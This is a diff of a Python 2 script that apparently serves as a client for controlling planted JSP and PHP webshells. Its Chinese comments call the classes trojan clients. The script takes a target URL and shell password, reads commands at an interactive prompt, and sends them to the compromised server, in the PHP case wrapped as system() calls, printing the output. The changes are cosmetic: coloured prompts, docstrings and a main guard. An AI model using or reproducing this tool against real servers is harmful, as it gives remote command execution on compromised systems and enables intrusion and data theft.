@@ -1,12 +1,12 @@
-#!coding=utf-8
+# -*- coding:utf-8 -*-
 
 '''
 __date__:2016.9.18
 __author__:nmask
 __Blog__:http://thief.one
+__Python_Version_:2.7.11
 '''
 
-import httplib
 import urllib
 import urllib2
 import binascii
@@ -15,8 +15,20 @@ import sys
 import argparse
 
 
-class jsp:
+headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'}
 
+RED = '\033[1;31m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+WHITE = '\033[1;37m'
+BLUE='\033[1;34m'
+END = '\033[0m'
+
+
+class jsp:
+	'''
+	jsp木马客户端代码类
+	'''
 	def __init__(self,url,password):
 		self.url=url
 		self.password=password
@@ -35,7 +47,7 @@ class jsp:
 	def cmd(self):
 		try:
 			shell_path=""
-			shell_cmd = raw_input("Shell>")
+			shell_cmd = raw_input(GREEN+"JSP_Shell>"+END)
 			while(cmp(shell_cmd,"q")):
 				
 				if shell_cmd!="":
@@ -76,12 +88,14 @@ class jsp:
 						sys.stdout.write(s[0][3:]) 	#输出执行结果
 						for i in range(1,len(s)-1):
 							print s[i]	#输出执行结果
-						shell_cmd = raw_input("Shell>")
+				shell_cmd = raw_input(GREEN+"JSP_Shell>"+END)
 		except Exception, e:
 			print e
 
 class php:
-
+	'''
+	php木马客户端代码类
+	'''
 	def __init__(self,url,password):
 		self.url=url
 		self.password=password
@@ -93,7 +107,7 @@ class php:
 	def cmd(self):
 		try:
 			content=''
-			cmd=raw_input('Shell>:')
+			cmd=raw_input(GREEN+'PHP_Shell>'+END)
 			while(cmp(cmd,"q")):
 				if cmd!="":
 					content='system'+'('+'"'+cmd+'"'+');'
@@ -110,21 +124,24 @@ class php:
 						)
 					response=urllib2.urlopen(req).read()
 					print response
-					cmd=raw_input('Shell>:')
+					cmd=raw_input(GREEN+'PHP_Shell>'+END)
 				else:
-					cmd=raw_input('Shell>:')
+					cmd=raw_input(GREEN+'PHP_Shell>'+END)
 		except Exception,e:
 			print e
 
 
 def proxy():
-	proxy={'http':'127.0.0.1:8888'}
+	'''
+	代理函数
+	'''
+	proxy={'http':'127.0.0.1:8888'} #本地代理地址
 	proxy_support=urllib2.ProxyHandler(proxy)
 	opener=urllib2.build_opener(proxy_support)
 	urllib2.install_opener(opener)
 
 
-def main(url,password):   ## 判断是JSP还是PHP
+def main(url,password):   #判断是JSP木马还是PHP木马
 
 	filename=url[-4:].lower()
 
@@ -138,19 +155,19 @@ def main(url,password):   ## 判断是JSP还是PHP
 		
 
 
+if __name__=="__main__":
 
-headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)'}
-parser=argparse.ArgumentParser()
-parser.add_argument("-u","--url",help="target_url",default="")
-parser.add_argument("-p","--pwd",help="shell_password",default="")
-parser.add_argument("--proxy",help="local_proxy",action='store_true')
-args=parser.parse_args()
+	parser=argparse.ArgumentParser()
+	parser.add_argument("-u","--url",help="target_url",default="")
+	parser.add_argument("-p","--pwd",help="shell_password",default="")
+	parser.add_argument("--proxy",help="local_proxy",action='store_true')
+	args=parser.parse_args()
 
-url=args.url
-password=args.pwd
+	url=args.url
+	password=args.pwd
 
-if args.proxy:
-	proxy()               #开启抓包，方便调试
+	if args.proxy:
+		proxy()               #开启抓包，方便调试
 
-main(url,password)
+	main(url,password)
 
